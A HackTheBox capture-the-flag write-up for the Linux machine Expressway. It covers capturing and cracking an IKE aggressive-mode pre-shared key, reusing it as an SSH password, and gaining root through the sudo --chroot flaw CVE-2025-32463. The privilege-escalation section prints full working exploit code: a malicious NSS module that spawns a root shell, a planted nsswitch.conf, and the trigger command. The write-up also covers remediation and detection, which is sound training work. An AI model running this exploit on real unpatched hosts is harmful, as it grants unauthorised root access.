---
layout: default
title: "HackTheBox - Expressway"
---

# HackTheBox - Expressway

**OS:** Linux (Debian 13, kernel 6.16)

Expressway is a Linux machine whose entire attack surface is two ports: SSH on TCP and an
IKE/IPsec VPN responder on UDP. The VPN is configured for IKEv1 **aggressive mode** with
pre-shared-key authentication, a long-deprecated mode that hands an unauthenticated attacker a
crackable PSK hash and the gateway's local identity in a single packet exchange. The leaked
identity (`ike@expressway.htb`) supplies a username, and the cracked PSK turns out to be reused
verbatim as that user's SSH password. From the `ike` foothold, a custom `sudo` binary planted in
`/usr/local/bin` (and first in `PATH`) is version 1.9.17, vulnerable to **CVE-2025-32463**, a
`--chroot` flaw that loads an attacker-controlled NSS module as root. That yields a root shell
even though `ike` has no sudo rights at all.

| Field | Value |
|---|---|
| Platform | HTB |
| Target | `<target-ip>` (expressway.htb) |
| Initial Access | IKE aggressive-mode PSK capture -> offline crack -> SSH credential reuse |
| Privilege Escalation | CVE-2025-32463 (sudo 1.9.17 `--chroot` NSS local root) |
| Final Access | `root` |

---

## Recon

### Port Scan

A full TCP sweep returned a single open port, with a notably modern OpenSSH banner:

```
$ nmap -p- --min-rate 5000 -T4 <target-ip>
PORT   STATE SERVICE
22/tcp open  ssh

$ nmap -sCV -p22 <target-ip>
22/tcp open  ssh  OpenSSH 10.0p2 Debian 8 (protocol 2.0)
| ssh-auth-methods:
|   Supported authentication methods:
|     publickey
|_    password
```

One TCP port is unusual for a box, so a UDP sweep was run rather than assuming SSH was the only
way in. The top-100 UDP scan found the real entry point:

```
$ nmap -sU --top-ports 100 <target-ip>
PORT    STATE SERVICE
500/udp open  isakmp
```

| Port | Proto | Service | Notes |
|---|---|---|---|
| 22 | TCP | SSH | OpenSSH 10.0p2 Debian 8, password auth enabled |
| 500 | UDP | ISAKMP / IKE | IPsec VPN key-exchange responder |

> **Why this works:** UDP is silently dropped by default in most quick scans, so a box that
> "only has SSH" frequently has its real foothold sitting on UDP. ISAKMP on 500/udp means an
> IPsec VPN gateway, an attack surface that has nothing to do with SSH and is easy to miss.

### Fingerprinting the IKE Responder

`ike-scan` confirms the gateway answers in **Main Mode** and, critically, also in **Aggressive
Mode**. The transform set is the textbook weak profile: 3DES / SHA1 / DH group 2 / PSK.

```
$ ike-scan -M <target-ip>
Main Mode Handshake returned
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

$ ike-scan -A -M <target-ip>
Aggressive Mode Handshake returned
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        Hash(20 bytes)
```

Two findings fall straight out of the aggressive-mode reply:

1. **A local identity is disclosed:** `ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)`. That
   gives both a domain (`expressway.htb`) and, more usefully, a username candidate: `ike`.
2. **A PSK hash is returned** (`Hash(20 bytes)`), which is the value needed to mount an offline
   PSK crack.

> **Why aggressive mode is the bug:** in IKEv1 Main Mode the identity and the
> authentication hash are exchanged *after* a Diffie-Hellman key has been established, so they
> are encrypted on the wire. Aggressive Mode collapses the exchange into three messages and
> sends the responder's identity and a hash derived from the PSK **before** any encryption is
> in place. An unauthenticated attacker who simply initiates the handshake therefore walks away
> with everything needed to brute-force the PSK offline, no man-in-the-middle required.

---

## Initial Access

### Capturing and Cracking the PSK

`ike-scan` writes the captured material in `psk-crack` format with `--pskcrack`. The output file
holds the DH public values, nonces, cookies, the responder identity, and the SHA1 hash to crack
(reproduced here truncated/redacted):

```
$ ike-scan -A --pskcrack=ike_psk.txt <target-ip>
Aggressive Mode Handshake returned
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        Hash(20 bytes)

$ cat ike_psk.txt
<g_xr>:<g_xi>:<cky_r>:<cky_i>:<sai_b>:<idir_b>:<ni_b>:<nr_b>:<hash_r-redacted>
```

`psk-crack` runs a straight dictionary attack against that hash. With `rockyou.txt` it falls in
seconds:

```
$ psk-crack -d rockyou.txt ike_psk.txt
Starting psk-crack [ike-scan 1.9.6]
Running in dictionary cracking mode
key "fr***********************" matches SHA1 hash <hash_r-redacted>
Ending psk-crack: 8045040 iterations in 8.425 seconds (954955.64 iterations/sec)
```

> **Why this works:** the responder hash is `HASH_R = PRF(SKEYID, ...)` where
> `SKEYID = PRF(PSK, Ni | Nr)`. Every input to that computation except the PSK itself is in the
> captured packets, so a candidate password can be tested entirely offline by recomputing the
> hash. A dictionary-word PSK has no chance.

### Credential Reuse to SSH

The recovered PSK is just a string, and the disclosed identity already named a user (`ike`). The
fastest move is to test the PSK as that user's SSH password before doing anything more elaborate.
It works directly:

```
$ ssh ike@<target-ip>
ike@<target-ip>'s password: <PSK: fr***********************>

ike@expressway:~$ id; hostname
uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
expressway.htb

ike@expressway:~$ cat ~/user.txt
<user-flag-redacted>
```

> **Why this works:** the PSK is meant to authenticate the VPN, not a user, but the box reuses
> the same secret as `ike`'s login password. **Spray/reuse before you do anything fancy:** a
> single cracked secret was the VPN PSK *and* the SSH password, so testing reuse beat any further
> enumeration.

One detail stands out for the next phase: `ike` is a member of the `proxy` group
(gid 13), and its `.bash_history` is symlinked to `/dev/null`, a hint that the intended path is
local rather than history-leaked.

---

## Privilege Escalation

### Local Enumeration

`ike` has no sudo rights at all, which rules out the obvious path:

```
ike@expressway:~$ sudo -l
[sudo] password for ike:
Sorry, user ike may not run sudo on expressway.
```

A SUID sweep, however, shows a `sudo` binary in an unexpected place, `/usr/local/bin`, which is
**ahead of `/usr/bin` in `PATH`**:

```
ike@expressway:~$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/games

ike@expressway:~$ find / -perm -4000 -type f 2>/dev/null
/usr/local/bin/sudo          <-- shadows the system sudo
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/mount
...

ike@expressway:~$ ls -la /usr/local/bin/
-rwsr-xr-x 1 root root 1047040 Aug 29  2025 sudo
lrwxrwxrwx 1 root root       4 Aug 29  2025 sudoedit -> sudo
-rwxr-xr-x 1 root root 1218328 Aug 29  2025 cvtsudoers
-rwxr-xr-x 1 root root  401352 Aug 29  2025 sudoreplay
```

The two `sudo` binaries are different versions. The system one is patched; the planted one in
`/usr/local/bin` (the one that actually runs) is **1.9.17**:

```
ike@expressway:~$ /usr/local/bin/sudo --version | head -1
Sudo version 1.9.17

ike@expressway:~$ /usr/bin/sudo --version | head -1
Sudo version 1.9.13p3
```

> **Gotcha worth recording:** "user may not run sudo" does **not** mean sudo is a dead end.
> CVE-2025-32463 is a flaw in sudo's own privileged startup, it triggers regardless of the
> sudoers policy, so an account with zero sudo entitlements can still abuse a vulnerable binary.
> The deliberately weird `/usr/local/bin/sudo` (newer than the system package, SUID root, first
> in `PATH`) is the tell.

### CVE-2025-32463 (sudo `--chroot` NSS local root)

Sudo 1.9.14 through 1.9.17 support a `--chroot`/`-R` option that lets sudo evaluate the sudoers
policy *as if rooted at a user-supplied directory*. The bug: while still running as root, sudo
calls into glibc's NSS machinery (to resolve users/groups) **after** the chroot has been applied,
so it reads `etc/nsswitch.conf` from inside the attacker-controlled directory and loads whatever
shared library that file points at. A constructor in that library runs as root. It was patched in
1.9.17p1.

Rather than run an unknown downloaded PoC on the attack box, the exploit was written by hand from
the advisory and executed entirely on the target (no foreign binary touched the attack host). It
is three small pieces: a malicious NSS module, a fake `nsswitch.conf` pointing at it, and the
`sudo -R` invocation that loads it.

```
ike@expressway:/tmp$ mkdir -p exploit/woot/etc exploit/libnss_ && cd exploit

# 1. the payload: a constructor that runs the instant the library is loaded
ike@expressway:/tmp/exploit$ cat > woot.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void woot(void) {
    setreuid(0, 0);
    setregid(0, 0);
    chdir("/");
    execl("/bin/bash", "bash", "-i", (char *)NULL);
}
EOF

# 2. nsswitch.conf inside the chroot, pointing passwd lookups at our module name
ike@expressway:/tmp/exploit$ echo 'passwd: /woot1337' > woot/etc/nsswitch.conf
ike@expressway:/tmp/exploit$ cp /etc/group woot/etc/

# 3. compile the module so glibc finds it as libnss_woot1337.so.2
ike@expressway:/tmp/exploit$ gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot.c

# 4. trigger: -R chroots into ./woot, sudo loads ./libnss_/woot1337.so.2 as root
ike@expressway:/tmp/exploit$ sudo -R woot woot
root@expressway:/# id
uid=0(root) gid=0(root) groups=0(root),13(proxy),1001(ike)

root@expressway:/# cat /root/root.txt
<root-flag-redacted>
```

> **Why this works:** the chroot is applied while sudo still holds root, and the subsequent NSS
> lookup resolves `libnss_woot1337.so.2` relative to the working directory's `libnss_/` path. The
> `passwd: /woot1337` line in the planted `nsswitch.conf` is what makes glibc load that specific
> module name. Because the library's `__attribute__((constructor))` runs at load time, the
> attacker's code executes inside the still-privileged sudo process before any privileges are
> dropped.

Root achieved.

---

## Root Cause

Expressway chains three independent failures:

1. **IKEv1 Aggressive Mode with PSK is enabled on the VPN gateway.** This mode transmits the
   responder identity and a PSK-derived hash before encryption, allowing any unauthenticated
   network peer to capture a crackable hash and learn a valid username.
2. **A weak, dictionary-crackable PSK**, which is additionally **reused as a Linux account
   password**. One leaked secret therefore granted interactive SSH access.
3. **A vulnerable SUID `sudo` (1.9.17) planted ahead of the system binary in `PATH`**,
   exploitable via CVE-2025-32463 by any local user regardless of sudoers policy.

Break any one link, disable aggressive mode, use a strong/unique PSK, or patch sudo to 1.9.17p1,
and the path to root collapses.

## Impact

Full root compromise of the host starting from an unauthenticated position on the network. The
aggressive-mode disclosure alone is a serious finding: it leaks a valid identity and enables
offline PSK recovery, which in a real environment would grant VPN access into the internal
network. Combined with credential reuse and the local sudo flaw, an external attacker reaches
complete control of the gateway.

## Remediation

Ordered by priority. The first two break the demonstrated path; the rest are hardening.

**1. Disable IKEv1 Aggressive Mode (highest priority).** Migrate the VPN to **IKEv2**, which does
not expose identities or auth material pre-encryption. If IKEv1 must remain, force Main Mode only
and never accept aggressive-mode proposals. In strongSwan this means removing `aggressive=yes`
(legacy `ipsec.conf`) / setting `aggressive = no` and preferring IKEv2 connections.

**2. Patch sudo and remove the planted binary.** Upgrade sudo to **1.9.17p1 or later** to close
CVE-2025-32463, and delete the rogue `/usr/local/bin/sudo` (and `sudoedit`/`cvtsudoers`/
`sudoreplay`) so only the distribution-managed, patched binary remains. Audit `PATH` ordering so
`/usr/local/bin` cannot silently shadow system binaries for privileged operations.

**3. Use a strong, unique pre-shared key, and rotate it.** The PSK was a single dictionary
phrase. Replace it with a long random value, and never reuse a VPN PSK as a user account
password. Prefer certificate-based (pubkey/EAP-TLS) authentication over PSK entirely.

**4. Don't disclose internal identities in the IKE ID payload.** Use a generic, non-account local
identity for the gateway rather than a real username (`ike@expressway.htb` directly seeded the
foothold).

**5. Enforce unique credentials.** Decouple service/VPN secrets from interactive login
credentials so a single compromise cannot pivot between layers.

### Validation

- Run `ike-scan -A <gateway>` and confirm **no** aggressive-mode handshake is returned.
- Confirm `sudo --version` reports 1.9.17p1+ and that `/usr/local/bin/sudo` no longer exists.
- Attempt the `sudo -R` PoC with a low-privilege user and confirm it fails.
- Confirm the VPN PSK does not authenticate against any local/SSH account.

## Detection Opportunities

- **IKE aggressive-mode probing:** repeated ISAKMP aggressive-mode initiations from a single
  external source on 500/udp; many VPN appliances can log/deny aggressive mode explicitly.
- **Offline PSK crack -> first login:** a successful SSH password login for a service-style
  account (`ike`) shortly after VPN probing, especially from the same source network.
- **CVE-2025-32463 exploitation:** `sudo` invoked with the `-R`/`--chroot` option by a
  non-administrative user; auditd `execve` records for `sudo -R`, and creation of
  `nsswitch.conf` / `libnss_*.so.2` files under user-writable paths like `/tmp`.
- **Rogue SUID binary:** integrity monitoring (AIDE/auditd) on `/usr/local/bin`; alert on any
  new SUID-root file, particularly one shadowing a system package name.

## Lessons Learned

- **Scan UDP.** A box that looks like "SSH only" had its entire foothold on 500/udp. The full
  attack path lived on a port a default TCP scan never touches.
- **IKE aggressive mode is a gift.** One `ike-scan -A` yields a username and an offline-crackable
  PSK hash in a single unauthenticated exchange.
- **Reuse beats cleverness.** The cracked PSK was the SSH password verbatim, test reuse before
  deeper enumeration.
- **"May not run sudo" is not the same as "sudo is safe."** CVE-2025-32463 fires irrespective of
  sudoers policy. A SUID `sudo` that is newer than the system package and sits first in `PATH` is
  a deliberate red flag worth a version check.

---

## Cleanup

- The exploit was written and compiled **on the target**; no foreign binary was run on the attack
  box (per code-review-before-execute discipline).
- All exploit artifacts were removed from the target after proving root: the `/tmp/exploit`
  staging directory (`woot.c`, the compiled `libnss_/woot1337.so.2`, the fake `nsswitch.conf`)
  and the spawned root shell were deleted/closed.
- No system files, services, or configuration were modified; the box can be reverted with no
  residual changes. Rotate the VPN PSK and the `ike` account password as part of remediation.
